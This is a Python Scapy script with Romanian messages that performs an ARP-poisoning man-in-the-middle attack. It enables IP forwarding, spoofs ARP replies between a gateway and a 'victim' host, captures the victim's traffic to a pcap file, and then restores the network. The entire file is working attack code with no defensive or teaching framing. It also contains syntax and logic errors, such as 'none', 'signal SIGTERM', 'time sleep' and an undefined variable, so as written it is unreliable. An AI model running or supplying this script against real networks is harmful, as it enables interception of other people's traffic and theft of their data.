from scapy.all import *
import os
import signal
import sys
import threading
import time

gateway_ip = "198.13.13.1"
target_ip = "198.13.0.14"
packet_count = 1000
conf.iface = "en5"
conf.verb = 0


def retrieve_mac(ip):
    resp, unans = sr(ARP(op=1,hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2,timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return none

def rest_network(gateway_ip, gateway_mac,target_ip,target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)

    print("[x] Oprire ip-forward")
    os.system("sysctl -w net.inet.ip.forwarding=0")
    os.kill(os.getpid(), signal SIGTERM)
    return none

def arp_poison(gateway_ip,gateway_mac,target_ip,target_mac):
    print("[x] Atac ARP poison pornit")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=gateway_ip))
            time sleep(4)
    except KeyboardInterrupt:
        print("[x] Oprim atacul... Restauram reteaua")
        rest_network(gateway_ip,gateway_mac,target_ip,target_mac)


print("[X] Pornim...")
print("[1] IP FORWARDING => 1")
os.system("sysctl -w net.inet.ip.forwarding=1")
print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Target IP address: {target_ip}")

gateway_mac = retrieve_mac(gateway_ip)
if gateway_mac is None:
    print("[!!!] Mac-ul gateway-ului nu a putut fi intors")
    sys.exit(0)
else:
    print(f"[*] Gateway Mac:{gateway_mac}")

target_mac = retrieve_mac(target_ip)
if target_mac is None:
    print("[!!!] Mac-ul victimei nu a putut fi intors")
    sys.exit(0)
else:
    print(f"[*] Mac-ul victimei:{target_mac}")

thread_atac = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
thread_atac.start()

try:
    sniff_filter = "ip host " + target_ip
    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Stopping network capture..Restoring network")
    rest_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Stopping network capture..Restoring network")
    rest_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)


